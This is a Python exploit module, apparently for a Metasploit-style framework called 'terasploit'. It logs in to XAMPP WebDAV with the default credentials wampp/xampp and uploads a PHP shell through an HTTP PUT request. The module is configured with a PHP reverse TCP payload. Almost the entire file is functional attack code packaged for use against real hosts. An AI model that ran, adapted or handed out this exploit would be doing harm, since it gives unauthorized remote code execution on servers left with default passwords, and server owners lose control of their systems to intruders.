#######
# Module/Exploit: XAMPP WebDav Upload PHP
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitModule(Exploit):
    
    module_type = 'exploit'
    payload = 'modules/payload/php/multi/reverse_tcp'
    encoder = None
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Module' : self.module_type,
                'Name' : 'XAMPP WebDav Upload PHP',
                'Author' : 'Charlie (4steroth)',
                
                'Sources' : [
                    'blu0 (https://github.com/blu0/webdav-exploit)',
                    'metasploit-framework'
                ],
                
                'Description' : [
                    'Takes advantage of weak webdav xampp passwords.',
                    'It uses the supplied credentials to exploit the',
                    'target and upload a shell.'
                ]
            }
        )
        
        if info_only:
            return
        
        register_option ('exploit',opt=[
            OptURL.new('target',['','yes','url of the target']),
            OptString.new('username','none',opt=['wampp','yes','username to use for authentication']),
            OptString.new('password','none',opt=['xampp','yes','password to use for authentication']),
            OptPort.new('rport',opt=[80,'yes','target port (tcp)']),
            OptString.new('path','none',opt=['/webdav/','yes','url path to attempt the upload'])
        ])

    def exploit(self) -> tuple[str, bool]: 

        target = self.GetOPT('target')
        username = self.GetOPT('username')
        password = self.GetOPT('password')
        rport = self.GetOPT('rport')
        path = self.GetOPT('path')
        shell = self.EncodeShell(self.encoder,self.payload.shell_content())
        
        scheme, hostname = self.ParseTarget(target,return_list=['scheme','hostname'])
        rand = self.RandomName()
        
        shell_url = f"{scheme}://{hostname}:{rport}/{path.rstrip('/').lstrip('/')}/{rand}.php"
        Shell(shell_url).new()
        
        info_print (f'Uploading shell to {shell_url}')
        try:
            exploit = HTTPClient.Request('put',url=shell_url,data=shell,auth=HTTPDigestAuth(username,password))
            if exploit.status_code in self.good_status_code():
                info_print (f'Status code: {exploit.status_code}',type='green')
                info_print (f'Shell uploaded: {shell_url}')
                return 'session', True
            else:
                info_print ('Exploit failed.',type='red')
                info_print (f'Status code: {exploit.status_code}')
                return 'session', False

        except Exception as error:
            info_print (error,type='red')
            return 'exception', True



